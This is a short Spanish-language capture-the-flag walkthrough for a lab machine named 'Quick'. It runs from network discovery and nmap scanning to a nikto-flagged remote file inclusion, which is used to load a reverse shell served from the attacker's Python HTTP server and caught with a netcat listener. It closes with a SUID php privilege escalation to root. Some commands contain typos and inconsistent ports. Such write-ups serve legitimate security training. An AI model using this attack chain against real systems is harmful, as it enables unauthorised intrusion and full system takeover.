## MAQUINA QUICK

Usamos la netdiscover para ver las maquinas conectadas en nuestra red

```console

>netdicover -i eth0 -r 192.x.x.x/24

```

Una vez que tengamos la ip, con nmap vamos a enumerar los puertos y servicios de la misma.

```console

>nmap -p- -open -sV -sC "ip" -oN TARGET

PORT
80/tcp open http

"STATE SERVICE VERSION
Apache httpd 2.4.41 ((Ubuntu))
l_http-server-header: Apache/2.4.41 (Ubuntu)
l_http-title: Quick Automative
MAC Address: 08:00:27:41:D3:56 (Oracle VirtualBox virtual NIC)"
```

Como tenemos el puerto 80 disponbile ingresamos a la pagina web.

Usamos nikto para ver si hay alguna vulnerabilidad en la web.

```console

>nikto -h "ip"

/index.php?page=http://blog.cirt.net/rfiinc.txt ?: Remote File Inclusion (RFI)
```

Tenemos una posible vuln. en la web, se trata de un RFI (remote-file-inclusion)

Aca lo que vamos a hacer es subir una RV (revershell.php) de pentestmokey a la maquina victima creando un servidor python.

```console
python3 -m http.server
```

Seguido nos ponemos en escucha con netcat al puerto que colocamos en la RV.
```console
nc -nlvp 1234
```

Ahora realizamos lo siguiente: 

Vamos a la URL de la pagina y colocamos nuestra ip + la revershell pentest monkey (http://$IP/revershell)(sin la extension).

Bien si todo salio excelente somos el usuarios www-data, ahora realizamos el tratamiento de la tty:

```console
$ script /dev/null -c bash
Script started, file is /dev/null

www-data@host:/$ ^Z
zsh: suspended  nc -nlvp 443

~$> stty raw -echo; fg

[1]  + continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm

www-data@host:/$ export TERM=xterm
www-data@host:/$ export SHELL=bash
```

Luego vemos que permisos SUID tenemos con el siguiente formato.

```console
find / -user root -perm /4000 2>/dev/null
```
Y como resultado tenemos un archivo:

```console
/usr/bin/php7.0
```

En gtfobins encontramos la manera de escalar priv.
```console
sudo install -m =xs $(which php) .

CMD="/bin/sh"
./php -r "pcntl exec('/bin/sh', ['-p']);"

```

Y listo somo User root
